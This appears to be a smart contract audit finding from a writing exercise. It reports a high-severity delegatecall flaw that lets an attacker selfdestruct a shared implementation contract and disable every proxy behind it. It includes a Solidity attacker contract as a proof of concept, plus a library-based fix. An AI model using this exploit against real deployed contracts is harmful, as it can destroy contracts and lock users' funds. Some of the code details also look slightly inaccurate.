# Delegate Call in an unsafe storage context

Severity: High

Context: [`Implementation.sol`](https://github.com/spearbit-audits/writing-exercise/blob/develop/contracts/Implementation.sol)

The exploit focus on Implementation.sol contract deployed once and used in Proxy.sol leading to disabling all proxy contracts.

**Proof of Concept**

The attacker calls callContract in implementation contract.

The callContract function calls the implementation contract again, using the delegatecallContract function.

The delegatecallContract function delegatecall the attack function in malicious contract, here the context is implementation contract.

When malicious contract executes Attack function it will exploit the implementation contract thus disable the Proxy Contract because the context is the implementation contract.

Here is an example of attacker contract that can selfdestruct the implementation contract by calling attack()

```solidity

function attack(address implementation) external {
  bytes memory data = abi.encodeWithSignature(
    "delegatecallContract(address,bytes)",
    address(this),
    abi.encodeWithSignature("destruct()")
  );
  Implementation(implementation).callContract(implementation, data);
}

function destruct() external {
  selfdestruct(implementation);
}

```

**Recommended Mitigation Steps**

When creating libraries, use stateless library, not contract, to ensure libraries will not modify caller storage data when caller uses delegatecall.
A library is a type of contract that doesn't allow payable functions and cannot have a fallback function (this limitations are enforced at compile time, therefore making it impossible for a library to hold funds

```solidity
library Implementation {
  function callContract(address a, bytes calldata _calldata)
    external
    returns (bytes memory)
  {
    (bool success, bytes memory ret) = a.call{ value: msg.value }(_calldata);
    require(success);
    return ret;
  }

  function delegatecallContract(address a, bytes calldata _calldata)
    external
    returns (bytes memory)
  {
    (bool success, bytes memory ret) = a.delegatecall(_calldata);
    require(success);
    return ret;
  }
}
```
